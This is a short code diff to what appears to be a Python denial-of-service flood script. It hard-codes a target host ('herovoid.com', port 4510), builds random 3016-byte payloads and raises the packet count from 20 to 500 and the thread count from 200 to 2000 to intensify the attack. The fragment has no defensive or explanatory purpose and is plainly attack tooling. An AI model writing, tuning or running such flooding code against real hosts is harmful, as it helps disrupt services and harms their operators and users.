@@ -31,8 +31,8 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 
 ip = str("herovoid.com")
 port = int("4510")
-pack = int("20")
-thread = int("200")
+pack = int("500")
+thread = int("2000")
 def start():
     global useragents, ref, acceptall
     hh = random._urandom(3016)
